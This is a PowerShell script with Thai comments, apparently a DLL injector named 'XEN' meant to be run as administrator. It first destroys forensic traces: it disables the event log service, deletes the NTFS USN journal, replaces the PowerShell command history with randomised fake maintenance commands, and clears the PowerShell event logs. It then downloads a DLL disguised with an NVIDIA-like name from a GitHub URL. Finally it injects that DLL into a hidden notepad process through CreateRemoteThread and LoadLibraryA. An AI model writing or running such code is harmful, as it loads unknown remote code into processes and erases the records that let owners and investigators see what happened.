# ตรวจสอบและบังคับให้รันด้วยสิทธิ์ Administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] กรุณาคลิกขวาเลือก 'Run with PowerShell' ด้วยสิทธิ์ Administrator" -ForegroundColor Yellow
    Pause
    Exit
}

function Run-AutoClean {
    Clear-Host
    Write-Host "[i]  (CLEAN)..." -ForegroundColor Yellow
    
    sc.exe config eventlog start= disabled 2>&1 | Out-Null
    fsutil usn deletejournal /d C: 2>&1 | Out-Null

    # 1. ดึงตำแหน่งไฟล์ History ของ PSReadLine
    $HistoryPath = (Get-PSReadLineOption).HistorySavePath

    if ($HistoryPath -and (Test-Path $HistoryPath)) {
        # 2. คัดเลือกเฉพาะคำสั่งดูแลระบบและเคลียร์ Temp สำคัญๆ
        $MaintenanceCommands = @(
            "Remove-Item -Path $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue",
            "Clear-RecycleBin -Force -ErrorAction SilentlyContinue",
            "Get-ChildItem C:\Windows\Temp -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue",
            "dism /online /cleanup-image /startcomponentcleanup",
            "ipconfig /flushdns",
            "Get-Volume",
            "Get-Service wuauserv",
            "Restart-Service wuauserv -ErrorAction SilentlyContinue",
            "Test-Connection 1.1.1.1 -Count 2",
            "Get-Date"
        )

        # 3. สุ่มเลือกมาแค่ 3 ถึง 6 คำสั่งพอ
        $RandomCount = Get-Random -Minimum 3 -Maximum 7
        $GeneratedHistory = for ($i = 0; $i -le $RandomCount; $i++) {
            Get-Random -InputObject $MaintenanceCommands
        }

        # 4. เขียนทับลงไปในไฟล์ History
        Set-Content -Path $HistoryPath -Value $GeneratedHistory -Force

        Write-Host "[+] Success ($RandomCount คำสั่ง)" -ForegroundColor Green
    } else {
        Write-Host "⚠️ ไม่พบไฟล์ History ของ PSReadLine" -ForegroundColor Yellow
    }

    try {
        $PowerShellLogs = Get-WinEvent -ListLog *PowerShell* -ErrorAction SilentlyContinue
        foreach ($log in $PowerShellLogs) {
            if ($log.LogName) {
                [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($null, $log.LogName)
            }
        }
    } catch {}

    Write-Host "[i] Cleaned" -ForegroundColor Green
    Start-Sleep -Seconds 1
}

Run-AutoClean
$DLL_URL = "https://raw.githubusercontent.com/aspectxxyz/dllxen/refs/heads/main/nvoifapi64.dll" 
$DllPath = "C:\ProgramData\nvoifapi64.dll"
$ProcessName = "notepad"

function Show-Menu {
    Clear-Host
    Write-Host "=========================================" -ForegroundColor Cyan
    Write-Host "                 XEN         " -ForegroundColor Yellow
    Write-Host "=========================================" -ForegroundColor Cyan
    
    # ตรวจสอบสถานะว่ามีไฟล์ DLL อยู่ใน Path หรือยัง
    $fileExists = Test-Path $DllPath
    
    if ($fileExists) {
        Write-Host "[1] INJECT " -ForegroundColor Green
    } else {
        Write-Host "[1] INSTALL [Download First]" -ForegroundColor Yellow
    }
    
    Write-Host "[2] UNINSTALL [DELETE]" -ForegroundColor Red
    Write-Host "[3] EXIT" -ForegroundColor Gray
    Write-Host "-----------------------------------------" -ForegroundColor Cyan
}

do {
    Show-Menu
    $choice = Read-Host "Select 1-3"

    switch ($choice) {
        "1" {
            $fileExists = Test-Path $DllPath
            if (-not $fileExists) {
                Write-Host "`n[!] Not Found File in : $DllPath" -ForegroundColor Yellow
                Write-Host "กำลังดาวน์โหลดไฟล์จาก GitHub..." -ForegroundColor Cyan
                
                try {
                    # สร้างโฟลเดอร์ปลายทางถ้ายังไม่มี
                    $destinationDir = Split-Path -Parent $DllPath
                    if ($destinationDir -and -not (Test-Path $destinationDir)) {
                        New-Item -ItemType Directory -Path $destinationDir -Force | Out-Null
                    }

                    # ทำการดาวน์โหลดไฟล์
                    Invoke-WebRequest -Uri $DLL_URL -OutFile $DllPath
                    Write-Host "[+] ดาวน์โหลดไฟล์สำเร็จ!" -ForegroundColor Green
                }
                catch {
                    Write-Host "[-] เกิดข้อผิดพลาดในการดาวน์โหลด: $_" -ForegroundColor Red
                    Read-Host "กด Enter เพื่อกลับสู่เมนูหลัก..."
                    continue
                }
            }
            
            # โหมด INJECT: เคลียร์ Notepad เก่าทิ้งก่อนทุกครั้ง เพื่อป้องกันการติดค้าง
            Get-Process -Name notepad -ErrorAction SilentlyContinue | Stop-Process -Force
            Start-Sleep -Seconds 1

            Write-Host "`n[->] กำลังดำเนินการ Inject DLL..." -ForegroundColor Cyan
            
            # เปิด Notepad แบบ Hidden ตัวใหม่สดๆ
            $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processStartInfo.FileName = "C:\Windows\System32\notepad.exe"
            $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            [System.Diagnostics.Process]::Start($processStartInfo) | Out-Null
            
            Start-Sleep -Seconds 2
            $process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1

            if (-not $process) {
                Write-Host "[-] ไม่สามารถเปิดหรือดึง Process ของ Notepad ได้" -ForegroundColor Red
                Read-Host "กด Enter เพื่อกลับสู่เมนูหลัก..."
                continue
            }

            Write-Host "[+] PID เป้าหมาย: $($process.Id)" -ForegroundColor Green
            # ประกาศ Win32 API
            $Signature = @"
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool CloseHandle(IntPtr hObject);
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
"@

            $TypeName = "Win32DllInjector_" + (Get-Random)
            $Win32API = Add-Type -MemberDefinition $Signature -Name $TypeName -Namespace "InjectUtils" -PassThru

            $PROCESS_ALL_ACCESS = 0x001F0FFF
            $MEM_COMMIT = 0x1000
            $MEM_RESERVE = 0x2000
            $PAGE_EXECUTE_READWRITE = 0x40

            $hProcess = $Win32API::OpenProcess($PROCESS_ALL_ACCESS, $false, $process.Id)
            if ($hProcess -eq [IntPtr]::Zero) {
                Write-Host "[-] เปิด Handle ไม่สำเร็จ (ลองรันด้วยสิทธิ์ Administrator)" -ForegroundColor Red
                Read-Host "กด Enter เพื่อกลับสู่เมนูหลัก..."
                continue
            }

            $dllPathBytes = [System.Text.Encoding]::ASCII.GetBytes($DllPath + "`0")
            $dllPathSize = $dllPathBytes.Length

            $pRemoteAddress = $Win32API::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllPathSize, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
            if ($pRemoteAddress -eq [IntPtr]::Zero) {
                Write-Host "[-] จองหน่วยความจำไม่สำเร็จ" -ForegroundColor Red
                $Win32API::CloseHandle($hProcess) | Out-Null
                Read-Host "กด Enter เพื่อกลับสู่เมนูหลัก..."
                continue
            }

            $bytesWritten = [IntPtr]::Zero
            $writeResult = $Win32API::WriteProcessMemory($hProcess, $pRemoteAddress, $dllPathBytes, $dllPathSize, [ref]$bytesWritten)
            if (-not $writeResult) {
                Write-Host "[-] เขียนข้อมูลลงหน่วยความจำไม่สำเร็จ" -ForegroundColor Red
                $Win32API::CloseHandle($hProcess) | Out-Null
                Read-Host "กด Enter เพื่อกลับสู่เมนูหลัก..."
                continue
            }

            $hKernel32 = $Win32API::GetModuleHandle("kernel32.dll")
            $pLoadLibrary = $Win32API::GetProcAddress($hKernel32, "LoadLibraryA")

            $hThread = $Win32API::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $pLoadLibrary, $pRemoteAddress, 0, [IntPtr]::Zero)
            if ($hThread -eq [IntPtr]::Zero) {
                $errCode = [System.Runtime.InteropServices.Marshal]::GetLastWinError()
                Write-Host "[-] สร้าง Remote Thread ไม่สำเร็จ (Error Code: $errCode)" -ForegroundColor Red
                $Win32API::CloseHandle($hProcess) | Out-Null
                Read-Host "กด Enter เพื่อกลับสู่เมนูหลัก..."
                continue
            }

            Write-Host "[+] ฉีด DLL เข้า Notepad สำเร็จเรียบร้อยแล้ว!" -ForegroundColor Cyan
            $Win32API::CloseHandle($hThread) | Out-Null
            $Win32API::CloseHandle($hProcess) | Out-Null
            
            Write-Host ""
            Read-Host "กด Enter เพื่อกลับสู่เมนูหลัก..."
        }
        "2" {
            # โหมด UNINSTALL (ลบไฟล์ DLL ออกจาก Path)
            Write-Host "`n[->] กำลังดำเนินการ UNINSTALL..." -ForegroundColor Yellow
            if (Test-Path $DllPath) {
                try {
                    Remove-Item $DllPath -Force
                    Write-Host "[+] ลบไฟล์ DLL ออกจาก Path เรียบร้อยแล้ว!" -ForegroundColor Green
                } catch {
                    Write-Host "[-] ไม่สามารถลบไฟล์ได้ (ไฟล์อาจกำลังถูกใช้งานอยู่)" -ForegroundColor Red
                }
            } else {
                Write-Host "[!] ไม่พบไฟล์ DLL ใน Path ดังกล่าวอยู่แล้ว" -ForegroundColor Yellow
            }
            Write-Host ""
            Read-Host "กด Enter เพื่อกลับสู่เมนูหลัก..."
        }
        "3" {
            Write-Host "ออกจากโปรแกรม..." -ForegroundColor Gray
            break
        }
        default {
            Write-Host "กรุณาเลือกตัวเลข 1 ถึง 3 เท่านั้น!" -ForegroundColor Red
            Start-Sleep -Seconds 1
        }
    }
} while ($true)
